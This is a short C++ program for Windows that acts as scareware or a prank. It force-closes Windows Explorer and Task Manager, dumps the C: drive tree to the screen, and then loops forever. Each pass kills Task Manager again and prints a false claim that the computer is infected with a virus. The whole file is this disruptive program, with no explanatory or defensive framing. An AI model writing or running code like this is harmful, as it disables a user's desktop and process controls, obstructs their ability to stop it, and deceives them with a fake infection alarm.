#include <iostream>

using namespace std;

int main()
{
    system("taskkill /f /im explorer.exe");
    system("taskkill /f /im taskmgr.exe");
    system("cls");
    system("color a");
    system("tree C:/");
    _sleep(1000);
    while(1){
        system("taskkill /f /im taskmgr.exe");
        system("cls");
        cout<<"your computer is infected with a virus";
        _sleep(100);
    }
    return 0;
}
